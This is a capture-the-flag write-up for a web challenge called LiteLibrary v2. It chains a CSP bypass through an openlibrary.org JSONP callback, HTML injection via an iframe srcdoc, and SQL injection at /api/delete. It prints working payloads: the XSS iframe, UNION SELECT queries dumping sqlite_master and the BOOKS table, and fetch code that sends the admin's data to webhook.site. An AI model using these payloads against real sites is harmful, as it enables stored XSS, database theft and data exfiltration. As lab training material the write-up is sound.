# LiteLibrary v2 Solution

We are presented with a CRUD library where we can add new books, mark books as favourite and delete books. The "liteShare" feature gives users a share link for any book using which they can share that book with other users.

Observations:

-   User input is being inserted into DOM using `innerHTML`
-   CSP header:
    ```
    default-src 'self' openlibrary.org;img-src 'self' raw.githubusercontent.com external-content.duckduckgo.com;base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';style-src 'self' https: 'unsafe-inline'
    ```
    -   Inline scripts and scripts from non-whitelisted sources are blocked
    -   `default-src` permits requests to the host openlibrary.org
        -   As `script-src` is not present the `default-src` rule also applies to script tags
    -   `img-src` permits `img` source requests to:
        -   raw.githubusercontent.com
        -   external-content.duckduckgo.com
-   `/api/delete`'s `title` URL query is vulnerable to SQL Injection
-   The `/report` endpoint available at the book sharing page `/liteShare` indicates that a bot might be visiting this page. Hence our first goal is CSP bypass so as to get JS running on this page.

---

On researching the Open Library API that is being used while adding a new book to the library, we come across the following [JSONP API endpoint](https://openlibrary.org/dev/docs/api/books): [`https://openlibrary.org/api/books?bibkeys=ISBN:1234&callback=processBooks`](https://openlibrary.org/api/books?bibkeys=ISBN:1234&callback=processBooks)

This endpoint can be maliciously consumed using a `<script>` tag as follows:

```
<script src="https://openlibrary.org/api/books?bibkeys=ISBN:1234&callback=alert(1337);//"></script>
```

Resulting output from endpoint:

```
alert(1337);//({"ISBN:1234": {"bib_key": "ISBN:1234", [...]}});
```

One might think that simply pasting the above script into one of the vulnerable (to HTML injection) fields such as the "Book Title" might give the alert popup, but this does not work. Unlike script tags inserted using `document.createElement()`, the script tags inserted using `innerHTML` [don't seem not load](https://security.stackexchange.com/q/60861). Hence we utilize an `iframe` to insert our payload into the DOM in order to get the alert popup. New payload:

```
<iframe
    srcdoc="ab<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=alert(1337);//'></script>cd"
></iframe>
```

---

On further testing we find that the script returned by the JSONP endpoint gets blocked by the browser if it contains `'`, `"`, `+`, etc. This is due to a protection feature built into the browser called ["OpaqueResponseBlocking"](https://chromestatus.com/feature/4933785622675456). The blocking in our case is due to the JSONP response's `content-type` header which is set to `application/json`. When the javascript response fails to get parsed as JSON, the browser flags it as suspicious and blocks it. We can bypass this WAF by sticking to template strings.

---

Now that we can run JS on the site, we shall proceed to get all the admin's books:

```
fetch(`/getBooks`)
    .then((r) => r.text())
    .then((r) => (window.top.location = `https://webhook.site/#!/abcdef?x=${r}"?x=${r}`));
```

The flag doesn't seem to be present amongst the limited set of books visible to the admin. Hence we utilize the SQL Injection at `/api/delete` to query all the tables:

```
/api/delete?title=" UNION SELECT group_concat(sql) FROM sqlite_master--
```

This returns a single record with the schema `CREATE TABLE BOOKS (title TEXT, author TEXT, pages TEXT, imageLink TEXT, link TEXT, fav TEXT, read TEXT, liteId TEXT)`.

---

SQL query:

```
/api/delete?title=" UNION SELECT group_concat(link) FROM BOOKS--
```

Javascript payload to be obtained from the JSONP API:

```
fetch(`/api/delete?title=" UNION SELECT group_concat(link) FROM BOOKS--`, {
    method: `post`,
})
    .then((r) => r.text())
    .then((r) => (window.top.location = `https://webhook.site/#!/abcdef?x=${r}`));
```

Final payload:

```
<iframe
    srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=fetch(`/api/delete/?title=%22 UNION SELECT group_concat(title) FROM BOOKS--`,{method:`post`}).then((r)=>r.text()).then((r)=>(window.top.location=`https://webhook.site/#!/abcdef?x=${r}`));//'></script>1337"
></iframe>
```

To extract all the data from the DB, we use `group_concat()` on each of the columns present in the `BOOKS` table.

We create a new book with the above payload as the title and report it to the admin from another account. After doing this for all columns, we find the flag in the `link` column.

[solve.py](solve.py)
